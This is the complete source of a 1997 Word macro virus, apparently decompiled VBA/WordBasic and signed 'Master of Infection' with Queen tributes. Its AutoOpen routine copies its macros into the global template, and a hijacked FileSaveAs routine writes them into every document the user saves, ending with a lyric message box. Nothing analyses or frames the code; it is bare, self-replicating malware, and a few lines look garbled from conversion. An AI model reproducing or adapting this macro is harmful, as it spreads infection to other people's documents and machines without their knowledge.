   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "(c) 1997 Master of infection\r\nQUEEN FOREVER!\r\nDedicated to the immortal spirit of Freddie Mecrury"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   '(c) 1997 Master of Infection
   'QUEEN FOREVER!!!
   namef$ = WordBasic.[WindowName$](0) + ":AutoOpen"
   named$ = "Global" + ":AutoOpen"
   namefa$ = WordBasic.[WindowName$](0) + ":FileSaveAs"
   nameda$ = "Global" + ":FileSaveAs"
   On Error GoTo -1: On Error GoTo ccc
   If WordBasic.[MacroName$](1, 0) = "FileSaveAs" Then GoTo cont
   ccc:
   WordBasic.MacroCopy namefa$, nameda$   ', - 1 Delete "'" to close Macro!
   WordBasic.MacroCopy namef$, named$
   Goto err.Number
   On Error Goto -1 : On Error Goto err.Number
   cont:
   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   n.Format = 1
   Rem n.Name = WindowName$(0)
   Rem If MacroName$(0) = "AutoOpen" Then Goto err
   WordBasic.MacroCopy nameda$, namefa$   ', - 1 Delete "'" to close
   WordBasic.MacroCopy named$, namef$  ', - 1 ------------||-----------
   WordBasic.FileSaveAs n
   Goto err.Number
   Err.Number:
   WordBasic.MsgBox "Now once upon a time An old man told me a fable ", " Track 6 ", 16
   End Sub
